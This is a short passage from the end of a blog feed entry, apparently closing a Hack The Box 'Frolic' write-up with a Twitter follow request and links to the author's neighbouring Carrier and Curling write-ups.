, follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Carrier Next Hack The Box write-up : Hack The Box - Curling</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/frolic/0.png" /></entry></feed>
